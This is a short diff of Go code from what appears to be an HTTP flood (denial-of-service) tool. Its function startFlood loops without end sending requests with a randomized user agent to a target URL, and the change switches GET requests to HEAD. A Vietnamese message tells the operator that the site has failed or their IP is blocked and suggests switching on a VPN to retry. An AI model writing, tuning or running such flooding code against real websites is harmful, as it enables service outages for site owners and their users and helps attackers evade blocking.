@@ -233,7 +233,7 @@ func startFlood(url string) {
 	num := rand.Intn(max - min) + min
 	userAgent := userAgents[num]
 	for {
-		req, err := http.NewRequest("GET", url, nil)
+		req, err := http.NewRequest("HEAD", url, nil)
 		if err != nil {
 			fmt.Println("  Thông báo, trang web đã bị lỗi hoặc IP của bạn bị chặn, hãy thử bật vpn và lặp lại.")
 			return
